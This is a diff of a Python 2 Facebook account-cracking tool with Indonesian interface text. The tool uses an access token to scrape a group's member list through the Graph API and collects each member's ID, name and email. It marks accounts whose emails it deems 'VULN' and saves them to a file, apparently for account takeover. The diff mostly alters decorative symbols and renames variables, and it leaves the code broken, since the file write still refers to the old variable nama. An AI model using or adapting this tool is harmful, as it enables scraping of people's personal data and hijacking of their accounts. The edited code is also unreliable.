@@ -17,6 +17,7 @@ br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+
 def keluar():
 	print "\x1b[1;91mExit"
 	os.sys.exit()
@@ -1134,7 +1135,7 @@ def pilih_crack():
         elif peak =="3":
                 os.system('clear')
 		print logo
-		print 42*"\033[1;96m●"
+		print 42*"\033[1;96m☆"
 		idg=raw_input('\033[1;96m[+] \033[1;93mClone ID group \033[1;91m:\033[1;97m ')
 		try:
 			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
@@ -2994,7 +2995,7 @@ def clone_dari_member_group():
 	print logo
 	mpsh = []
 	jml = 0
-	print 42*"\033[1;96m●"
+	print 42*"\033[1;96m◇"
 	id=raw_input('\033[1;96m[+] \033[1;93mClone  ID group \033[1;91m:\033[1;97m ')
 	try:
 		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
@@ -3014,7 +3015,7 @@ def clone_dari_member_group():
 		jml +=1
 		mpsh.append(jml)
 		id = w['id']
-		nama = w['name']
+		name = w['name']
 		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
 		z = json.loads(links.text)
 		try:
@@ -3036,16 +3037,16 @@ def clone_dari_member_group():
 					print("\033[1;96m[✓] \033[1;92mVULN")
 					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
 					print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
-					print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama)
+					print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+name)
 					save = open('out/GrupMailVuln.txt','a')
 					save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
 					save.close()
-					berhasil.append(mail)
+					oks.append(mail)
 		except KeyError:
 			pass
-	print 42*"\033[1;96m="
+	print 42*"\033[1;96m♡"
 	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
-	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
+	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(oks))
 	print"\033[1;96m[+] \033[1;92mFile lovehacker\033[1;91m:\033[1;97m out/GrupMailVuln.txt"
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	menu()
